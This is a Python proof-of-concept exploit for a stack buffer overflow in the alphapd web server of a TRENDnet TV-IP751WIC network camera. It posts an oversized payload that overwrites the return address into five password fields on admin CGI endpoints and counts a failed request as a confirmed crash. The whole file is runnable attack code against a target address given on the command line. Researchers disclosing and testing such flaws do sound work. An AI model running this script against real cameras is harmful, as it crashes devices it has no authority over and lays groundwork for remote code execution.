#!/usr/bin/env python3
"""PoC: TV-IP751WIC alphapd Multi-Password Stack Overflow | CWE-121 | CVSS 9.8"""
import requests, struct, sys

TARGET = sys.argv[1] if len(sys.argv)>1 else "192.168.1.100"
PAYLOAD = b"A" * 68 + struct.pack(">I", 0x41414141)

print(f"TV-IP751WIC Multi-Password Stack Overflow PoC")
print(f"Target: {TARGET}")
print(f"FirmRec: 80+ simexp hits @ 0x41414141 (CVE-2019-1663, CVE-2020-10214)")
print()

tests = [
    ("Admin Password", "/cgi-bin/admin/set_users.cgi", {"AdminPassword": PAYLOAD.decode("latin-1"), "UserPassword": "test"}),
    ("PPPoE Password", "/cgi-bin/admin/network.cgi", {"IPAddressMode": "PPPoE", "PPPoEPassword": PAYLOAD.decode("latin-1"), "PPPoEUserName": "user"}),
    ("DDNS Password",  "/cgi-bin/admin/ddns.cgi",   {"DDNSEnable": "1", "DDNSPassword": PAYLOAD.decode("latin-1")}),
    ("Email Password", "/cgi-bin/admin/email.cgi",  {"EmailPassword": PAYLOAD.decode("latin-1"), "EmailSMTPServerAddress": "smtp.example.com"}),
    ("FTP Password",   "/cgi-bin/admin/ftp.cgi",    {"FTPPassword": PAYLOAD.decode("latin-1"), "FTPHostAddress": "192.168.1.1"}),
]

for name, path, params in tests:
    try:
        r = requests.post(f"http://{TARGET}{path}", data=params, timeout=5)
        print(f"  [{r.status_code}] {name}")
    except:
        print(f"  [CRASH] {name} — overflow confirmed")
